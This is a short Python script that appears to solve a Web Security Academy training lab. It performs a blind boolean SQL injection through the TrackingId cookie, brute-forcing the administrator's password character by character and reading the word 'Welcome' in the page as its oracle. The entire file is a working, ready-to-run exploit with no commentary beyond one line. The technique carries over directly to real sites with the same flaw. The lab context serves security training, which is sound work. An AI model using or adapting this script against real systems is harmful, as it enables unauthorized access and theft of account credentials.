import requests
import string

url = "https://0ad200d5034f47b083fc66ae00dd0078.web-security-academy.net/"

headers = {
    "Host": "0ad200d5034f47b083fc66ae00dd0078.web-security-academy.net",
    "Cookie": "TrackingId=IHZuIGImD55arZn9' and (select substring(password,1,1) from users where username = 'administrator') = 'a; session=rODeR8C6myrs6Tc1K72EaJn3t6FANpE2",
    "Sec-Ch-Ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://0ad200d5034f47b083fc66ae00dd0078.web-security-academy.net/",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i"
}

characters = string.ascii_lowercase + string.digits

password = ""

for position in range(1, 21):  # Assuming the password is up to 20 characters long
    for char in characters:
        headers["Cookie"] = f"TrackingId=IHZuIGImD55arZn9' and (select substring(password,{position},1) from users where username = 'administrator') = '{char}; session=rODeR8C6myrs6Tc1K72EaJn3t6FANpE2"

        response = requests.get(url, headers=headers)

        if "Welcome" in response.text:
            password += char
            print(f"Correct digit found: {char} | Current password: {password}")
            break
    else:
        print(f"No character found for position {position}. Exiting.")
        break

print(f"Final password: {password}")